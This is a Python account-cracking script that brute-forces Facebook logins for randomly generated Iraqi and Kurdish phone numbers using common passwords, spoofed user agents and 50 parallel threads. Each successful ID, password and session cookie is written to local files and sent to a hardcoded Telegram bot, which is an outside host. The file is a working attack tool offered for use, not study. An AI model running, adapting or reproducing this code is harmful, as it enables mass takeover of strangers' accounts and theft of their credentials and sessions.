#GEN CODESS FROM IPYTHONI
import os,sys,time,json,random,re,string,platform,base64,uuid

os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    


            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
ORANGE = '\033[1;35m'
GREEN = '\033[1;32m'
WHITE = '\033[1;97m' #
BLUE = '\033[1;33m'
YELLOW = '\033[1;33m'
RED = '\033[1;91m'
M = '\x1b[1;97m' # PUTIH
P = '\x1b[1;91m' # MERAH
K = '\x1b[1;92m' # HIJAU
H = '\x1b[1;93m' # KUNING
U = '\x1b[1;94m' # BIRU
B = '\x1b[1;95m' # UNGU
N = '\x1b[1;96m' # BIRU MUDA
O = '\x1b[0m'    # WARNA MATI
BN = '\x1b[1;90m' # WARNA ABU ABU
A = '\x1b[1;107m' # BELAKANG PUTIH
new = '''5532739643'''
tool = '''6162209090:AAE5hgaWmJbk5C5kxP45Yuh76xuLSC4x22M'''
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =  ("""                         
\033[1;31m  _ __ ___   ___ | |__   __ _ _ \033[1;32m__ ___   __ _  __| |
\033[1;33m | '_ ` _ \ / _ \| '_ \ / _` | '_ ` \033[1;34m_ \ / _` |/ _` |
\033[1;35m | | | | | | (_) | | | | (_| | | | | | | \033[1;36m(_| | (_| |
\033[1;32m |_| |_| |_|\___/|_| |_|\__,_|_| \033[1;33m|_| |_|\__,_|\__,_|

 
 \033[1;31m𝑮𝑰𝑻𝑯𝑼𝑷    : \033[1;32mmohamad anan\033[1;31m
 𝘼𝙐𝙏𝙃𝙊𝙍       : \033[1;33m@jiooler
 \033[1;31mINSTAGR𝑹𝑨𝑴  : \033[1;33m@jiooler                 
 \033[1;31m𝑻𝑬𝑳𝑬𝑮𝑹𝑨𝑴  : \033[1;33m@jiooler
 \033[1;31m𝑻𝑶𝑶𝑳 𝑵𝑨𝑴𝑬 :\033[1;33mmohamad fb 𝑩𝑳𝑨𝑪𝑲         
              

\033[1;91m
\033[1;97m
\033[1;32m 
\033[1;32m  
                                        
""")
loop = 0
oks = []
cps = []



def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mWAIT FOR UPDATING \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t CRACK FOR KURDISH OR IRAQI")
    jalan('\033[1;36m     \t CODE PHONE NUMBER\n     \033[1;32m 770 780 760')
    num = '964770','964780','964772','964751','964784','964771'
    us = str(''.join(random.choice(num) for i in range(1)))
    code = us
    os.system("clear")
    print("CHAND IDS AWE DAINE NMUNA BNUSA 10000")
    limit = int(10000)
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(4)
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = '١٢٣٤٥٦'
        pww='١٢٣٤٥٦٧٨٩'
        pww='1234512345'
        pww='112233445566'
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;91m IDS: '+tl)
        print('\033[1;97m ONLY SUPPORT KOREK FOR CRACK')
        print('\033[1;32m#################################')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;34m >_CRACK TAWAW_<')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://t.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                open('okmohamad.txt', 'a').write( cid+' | '+ps+'\n')
                t='\033[1;92mok mohamad anan \n \033[1;93mid-->\033[1;96m'+cid+'\n\033[1;93m password-->\033[1;96m'+ps+'\n'+'\033[1;92mcookies=\033[1;95m'+coki+'\n'+pro
                print(t)
                cek_apk(session,coki)
                open('/sdcard/ok.txt', 'a').write( cid+' | '+ps+'\n')
                
                requests.get("https://api.telegram.org/bot"+str(tool)+"/sendMessage?chat_id="+str(new)+"&text="+str(t))
                oks.append(cid)
                follow(self, session, coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;31mCP = ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/cp.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r               %s[%s/%s]  [OK BLACK:%s]  [CP BLACK:%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

i()

